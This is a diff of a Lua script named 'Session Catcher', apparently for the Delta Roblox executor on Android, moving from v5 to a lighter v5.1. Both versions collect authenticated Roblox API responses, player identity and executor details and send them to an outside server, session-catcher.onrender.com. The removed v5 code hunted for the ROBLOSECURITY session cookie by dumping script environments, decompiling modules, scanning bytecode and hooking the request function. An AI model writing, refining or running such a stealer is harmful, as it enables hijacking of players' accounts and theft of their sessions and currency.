@@ -1,6 +1,6 @@
 -- ============================================================
 --  Session Catcher — Delta Executor (Android)
---  v5 — final probe: httpget auth, pibble, scripts, comm_channel
+--  v5.1 — lightweight: httpget auth + pibble only
 -- ============================================================
 
 local SERVER_URL = "https://session-catcher.onrender.com/catch"
@@ -11,41 +11,45 @@ if not httpRequest then return end
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
 
 local executorName, executorVersion = "Unknown", "Unknown"
 pcall(function()
     if identifyexecutor then executorName, executorVersion = identifyexecutor() end
 end)
 
+local placeName = "Unknown"
+pcall(function()
+    placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+end)
+
 -- -----------------------------------------------------------
--- 1. httpget с разными auth-эндпоинтами
+-- 1. httpget — Delta's function
 -- -----------------------------------------------------------
 local httpgetResults = {}
 
-local authEndpoints = {
+local endpoints = {
     "https://www.roblox.com/mobile/api/userinfo",
     "https://users.roblox.com/v1/users/authenticated",
-    "https://www.roblox.com/authentication/is-2fa-enabled",
-    "https://billing.roblox.com/v1/credit",
-    "https://economy.roblox.com/v1/user/currency",
-    "https://avatar.roblox.com/v1/avatar",
-    "https://presence.roblox.com/v1/presence/last-online"
+    "https://economy.roblox.com/v1/user/currency"
 }
 
--- httpget (Delta)
-for _, url in ipairs(authEndpoints) do
-    local ok, resp = pcall(function()
-        if httpget then return httpget(url) end
-    end)
-    if ok and resp then
-        httpgetResults["httpget:" .. url] = resp:sub(1, 500)
-    else
-        httpgetResults["httpget:" .. url] = "FAILED: " .. tostring(resp):sub(1, 200)
+if httpget then
+    for _, url in ipairs(endpoints) do
+        local ok, resp = pcall(httpget, url)
+        if ok and resp then
+            httpgetResults["httpget:" .. url] = resp:sub(1, 500)
+        else
+            httpgetResults["httpget:" .. url] = "FAILED: " .. tostring(resp):sub(1, 200)
+        end
+        task.wait(0.5)
     end
 end
 
--- game:HttpGet (Roblox native)
-for _, url in ipairs(authEndpoints) do
+-- -----------------------------------------------------------
+-- 2. game:HttpGet — Roblox native
+-- -----------------------------------------------------------
+for _, url in ipairs(endpoints) do
     local ok, resp = pcall(function()
         return game:HttpGet(url)
     end)
@@ -54,31 +58,34 @@ for _, url in ipairs(authEndpoints) do
     else
         httpgetResults["gameHttpGet:" .. url] = "FAILED: " .. tostring(resp):sub(1, 200)
     end
+    task.wait(0.5)
 end
-
--- game.HttpGet (alternative)
-for _, url in ipairs(authEndpoints) do
-    local ok, resp = pcall(function()
-        return game.HttpGet(game, url)
-    end)
-    if ok and resp then
-        httpgetResults["gameHttpGetAlt:" .. url] = resp:sub(1, 500)
-    else
-        httpgetResults["gameHttpGetAlt:" .. url] = "FAILED: " .. tostring(resp):sub(1, 200)
-    end
-end
-
--- httppost (Delta) — POST на наш сервер с auth-запросом
-local httppostResult = ""
-pcall(function()
-    if httppost then
-        local resp = httppost("https://www.roblox.com/mobile/api/userinfo", "")
-        httppostResult = resp:sub(1, 500) or "EMPTY"
-    end
-end)
 
 -- -----------------------------------------------------------
--- 2. pibble table — вызываем все функции
+-- 3. request() к auth endpoints — может кука в ответе
+-- -----------------------------------------------------------
+for _, url in ipairs(endpoints) do
+    local ok, resp = pcall(httpRequest, {
+        Url = url,
+        Method = "GET"
+    })
+    if ok and resp then
+        local body = resp.Body or ""
+        local headers = {}
+        if resp.Headers then
+            for k, v in pairs(resp.Headers) do
+                headers[tostring(k)] = tostring(v):sub(1, 200)
+            end
+        end
+        httpgetResults["request:" .. url] = "Status:" .. tostring(resp.StatusCode) .. " Body:" .. body:sub(1, 300)
+    else
+        httpgetResults["request:" .. url] = "FAILED: " .. tostring(resp):sub(1, 200)
+    end
+    task.wait(0.5)
+end
+
+-- -----------------------------------------------------------
+-- 4. pibble — все функции по очереди, аккуратно
 -- -----------------------------------------------------------
 local pibbleResults = {}
 
@@ -86,248 +93,52 @@ pcall(function()
     local genv = getgenv and getgenv() or _G
     local pbl = genv.pibble
     if pbl then
-        -- gmail()
-        local ok1, res1 = pcall(function()
-            if pbl.gmail then return pbl.gmail() end
-        end)
-        pibbleResults["gmail"] = ok1 and tostring(res1):sub(1, 500) or "FAILED: " .. tostring(res1):sub(1, 200)
+        -- gmail
+        local ok1, res1 = pcall(function() return pbl.gmail() end)
+        pibbleResults["gmail()"] = ok1 and tostring(res1):sub(1, 500) or "ERR: " .. tostring(res1):sub(1, 200)
         
-        -- washington()
-        local ok2, res2 = pcall(function()
-            if pbl.washington then return pbl.washington() end
-        end)
-        pibbleResults["washington"] = ok2 and tostring(res2):sub(1, 500) or "FAILED: " .. tostring(res2):sub(1, 200)
+        task.wait(0.3)
         
-        -- getpibbles()
-        local ok3, res3 = pcall(function()
-            if pbl.getpibbles then return pbl.getpibbles() end
-        end)
-        pibbleResults["getpibbles"] = ok3 and tostring(res3):sub(1, 500) or "FAILED: " .. tostring(res3):sub(1, 200)
+        -- washington
+        local ok2, res2 = pcall(function() return pbl.washington() end)
+        pibbleResults["washington()"] = ok2 and tostring(res2):sub(1, 500) or "ERR: " .. tostring(res2):sub(1, 200)
         
-        -- is_pibble()
-        local ok4, res4 = pcall(function()
-            if pbl.is_pibble then return pbl.is_pibble() end
-        end)
-        pibbleResults["is_pibble"] = ok4 and tostring(res4) or "FAILED: " .. tostring(res4):sub(1, 200)
+        task.wait(0.3)
         
-        -- is_detected()
-        local ok5, res5 = pcall(function()
-            if pbl.is_detected then return pbl.is_detected() end
-        end)
-        pibbleResults["is_detected"] = ok5 and tostring(res5) or "FAILED: " .. tostring(res5):sub(1, 200)
-    end
-end)
-
--- -----------------------------------------------------------
--- 3. get_comm_channel / create_comm_channel
--- -----------------------------------------------------------
-local commChannelResults = {}
-
-pcall(function()
-    if get_comm_channel then
-        local ok, ch = pcall(get_comm_channel)
-        commChannelResults["get_comm_channel"] = ok and tostring(ch):sub(1, 500) or "FAILED: " .. tostring(ch):sub(1, 200)
-    end
-end)
-
-pcall(function()
-    if create_comm_channel then
-        local ok, ch = pcall(create_comm_channel)
-        commChannelResults["create_comm_channel"] = ok and tostring(ch):sub(1, 500) or "FAILED: " .. tostring(ch):sub(1, 200)
-    end
-end)
-
--- -----------------------------------------------------------
--- 4. getsenv на core scripts
--- -----------------------------------------------------------
-local senvDumps = {}
-
-pcall(function()
-    if getsenv and getscripts then
-        local scripts = getscripts()
-        for _, script in ipairs(scripts) do
-            local name = script.Name or tostring(script)
-            local lowerName = name:lower()
-            -- Ищем скрипты связанные с auth/session/login/cookie/security
-            if lowerName:find("auth") or lowerName:find("session") or lowerName:find("login") 
-               or lowerName:find("cookie") or lowerName:find("security") or lowerName:find("token")
-               or lowerName:find("network") or lowerName:find("http") or lowerName:find("api") then
-                local ok, senv = pcall(getsenv, script)
-                if ok and senv then
-                    local keys = {}
-                    local cookieFound = ""
-                    for k, v in pairs(senv) do
-                        local kStr = tostring(k)
-                        local vStr = tostring(v)
-                        table.insert(keys, kStr .. ":" .. type(v))
-                        -- Ищем куку в значениях
-                        if type(v) == "string" then
-                            if v:find("_|WARNING") or v:find("ROBLOSECURITY") then
-                                cookieFound = v:sub(1, 500)
-                            end
-                        end
-                    end
-                    senvDumps[name] = {
-                        keys = keys,
-                        cookieFound = cookieFound
-                    }
-                end
-            end
-        end
-    end
-end)
-
--- -----------------------------------------------------------
--- 5. getloadedmodules — ищем auth-модули
--- -----------------------------------------------------------
-local authModules = {}
-
-pcall(function()
-    if getloadedmodules then
-        local modules = getloadedmodules()
-        for _, mod in ipairs(modules) do
-            local name = mod.Name or tostring(mod)
-            local lowerName = name:lower()
-            if lowerName:find("auth") or lowerName:find("session") or lowerName:find("login")
-               or lowerName:find("cookie") or lowerName:find("security") or lowerName:find("token")
-               or lowerName:find("network") or lowerName:find("http") then
-                table.insert(authModules, name)
-                
-                -- Пытаемся декомпилировать
-                if decompile then
-                    local ok, source = pcall(decompile, mod)
-                    if ok and source then
-                        -- Ищем упоминания куки
-                        if source:find("_|WARNING") or source:find("ROBLOSECURITY") 
-                           or source:find("cookie") or source:find("Cookie") then
-                            -- Извлекаем контекст вокруг
-                            local start = source:find("ROBLOSECURITY") or source:find("_|WARNING")
-                            if start then
-                                local s = math.max(1, start - 100)
-                                local e = math.min(#source, start + 500)
-                                authModules[#authModules] = name .. " => COOKIE_REF: " .. source:sub(s, e)
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    end
-end)
-
--- -----------------------------------------------------------
--- 6. Hook request — перехватываем внутренние вызовы
--- -----------------------------------------------------------
-local interceptedHeaders = {}
-local interceptCount = 0
-
-pcall(function()
-    if hookfunction then
-        local original = request
-        local hooked = newcclosure(function(args)
-            interceptCount = interceptCount + 1
-            if type(args) == "table" then
-                local entry = {
-                    url = args.Url or "N/A",
-                    method = args.Method or "GET",
-                    headers = {}
-                }
-                if args.Headers then
-                    for k, v in pairs(args.Headers) do
-                        entry.headers[tostring(k)] = tostring(v):sub(1, 300)
-                        if tostring(k):lower():find("cookie") or tostring(v):find("_|WARNING") or tostring(v):find("ROBLOSECURITY") then
-                            table.insert(interceptedHeaders, entry)
-                        end
-                    end
-                end
-                table.insert(interceptedHeaders, entry)
-            end
-            return original(args)
-        end)
-        hookfunction(request, hooked)
+        -- getpibbles
+        local ok3, res3 = pcall(function() return pbl.getpibbles() end)
+        pibbleResults["getpibbles()"] = ok3 and tostring(res3):sub(1, 500) or "ERR: " .. tostring(res3):sub(1, 200)
         
-        -- Ждём 3 секунды, может Roblox сделает внутренний HTTP запрос
-        task.wait(3)
+        task.wait(0.3)
+        
+        -- is_pibble
+        local ok4, res4 = pcall(function() return pbl.is_pibble() end)
+        pibbleResults["is_pibble()"] = ok4 and tostring(res4) or "ERR: " .. tostring(res4):sub(1, 200)
+        
+        task.wait(0.3)
+        
+        -- is_detected
+        local ok5, res5 = pcall(function() return pbl.is_detected() end)
+        pibbleResults["is_detected()"] = ok5 and tostring(res5) or "ERR: " .. tostring(res5):sub(1, 200)
     end
 end)
 
 -- -----------------------------------------------------------
--- 7. getinstances — ищем объекты с auth данными
+-- 5. Delta table — вызываем info-функции
 -- -----------------------------------------------------------
-local authInstances = {}
+local deltaInfo = {}
 
-pcall(function()
-    if getinstances then
-        local instances = getinstances()
-        for _, inst in ipairs(instances) do
-            local name = inst.Name or ""
-            local className = inst.ClassName or ""
-            local lowerName = name:lower()
-            if lowerName:find("auth") or lowerName:find("session") or lowerName:find("token")
-               or lowerName:find("cookie") or lowerName:find("security") then
-                table.insert(authInstances, name .. " (" .. className .. ")")
-                
-                -- Проверяем скрытые свойства
-                if gethiddenproperty then
-                    local props = {"Value", "Text", "Cookie", "Token", "Session", "Auth"}
-                    for _, prop in ipairs(props) do
-                        local ok, val = pcall(gethiddenproperty, inst, prop)
-                        if ok and val and type(val) == "string" and #val > 10 then
-                            table.insert(authInstances, "  └ " .. prop .. " = " .. val:sub(1, 300))
-                        end
-                    end
-                end
-            end
-        end
-    end
-end)
-
--- -----------------------------------------------------------
--- 8. WebSocket — есть ли WS функции
--- -----------------------------------------------------------
-local wsInfo = ""
 pcall(function()
     local genv = getgenv and getgenv() or _G
-    if genv.WebSocket then
-        local keys = {}
-        for k, v in pairs(genv.WebSocket) do
-            table.insert(keys, tostring(k) .. ":" .. type(v))
-        end
-        wsInfo = table.concat(keys, ", ")
-    end
-end)
-
--- -----------------------------------------------------------
--- 9. setrbxclipboard — пробуем через буфер обмена
--- -----------------------------------------------------------
-local rbxClipboardInfo = ""
-pcall(function()
-    if setrbxclipboard then
-        rbxClipboardInfo = "setrbxclipboard exists"
-    end
-end)
-
--- -----------------------------------------------------------
--- 10. getscriptbytecode на CoreScripts
--- -----------------------------------------------------------
-local bytecodeSnippets = {}
-
-pcall(function()
-    if getscripts and getscriptbytecode then
-        local scripts = getscripts()
-        for _, script in ipairs(scripts) do
-            local name = script.Name or tostring(script)
-            local lowerName = name:lower()
-            if lowerName:find("auth") or lowerName:find("login") or lowerName:find("session") then
-                local ok, bytecode = pcall(getscriptbytecode, script)
-                if ok and bytecode then
-                    -- Ищем паттерн куки в байткоде
-                    if bytecode:find("_|WARNING") or bytecode:find("ROBLOSECURITY") then
-                        bytecodeSnippets[name] = "COOKIE FOUND IN BYTECODE: " .. bytecode:sub(1, 500)
-                    else
-                        bytecodeSnippets[name] = "No cookie in bytecode (len: " .. #bytecode .. ")"
-                    end
-                end
+    local d = genv.Delta
+    if d then
+        local funcs = {"version", "version_num", "version_hash", "roblox_version", 
+                       "get_platform", "architecture", "architecture_str",
+                       "is_android", "is_ios", "is_mac", "is_vng"}
+        for _, fn in ipairs(funcs) do
+            if d[fn] then
+                local ok, res = pcall(d[fn])
+                deltaInfo[fn] = ok and tostring(res):sub(1, 200) or "ERR: " .. tostring(res):sub(1, 100)
             end
         end
     end
@@ -341,23 +152,14 @@ local payload = {
     username = LocalPlayer.Name,
     displayName = LocalPlayer.DisplayName,
     placeId = game.PlaceId,
-    placeName = (MarketplaceService and pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId).Name end)) or "Unknown",
+    placeName = placeName,
     jobId = game.JobId,
     executor = executorName,
     executorVersion = executorVersion,
     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
     httpgetResults = httpgetResults,
-    httppostResult = httppostResult,
     pibbleResults = pibbleResults,
-    commChannelResults = commChannelResults,
-    senvDumps = senvDumps,
-    authModules = authModules,
-    interceptedHeaders = interceptedHeaders,
-    interceptCount = interceptCount,
-    authInstances = authInstances,
-    wsInfo = wsInfo,
-    rbxClipboardInfo = rbxClipboardInfo,
-    bytecodeSnippets = bytecodeSnippets
+    deltaInfo = deltaInfo
 }
 
 local success, response = pcall(function()
@@ -373,12 +175,9 @@ local success, response = pcall(function()
 end)
 
 if success then
-    print("[Catcher] v5 sent. Status: " .. (response.StatusCode or "unknown"))
-    print("[Catcher] httpget results: " .. #httpgetResults)
-    print("[Catcher] pibble results: " .. #pibbleResults)
-    print("[Catcher] intercepted: " .. interceptCount)
-    print("[Catcher] auth modules: " .. #authModules)
-    print("[Catcher] auth instances: " .. #authInstances)
+    print("[Catcher] v5.1 sent. Status: " .. (response.StatusCode or "unknown"))
+    print("[Catcher] HTTP results: " .. table.getn(httpgetResults))
+    print("[Catcher] Pibble results: " .. table.getn(pibbleResults))
 else
     warn("[Catcher] Failed: " .. tostring(response))
 end
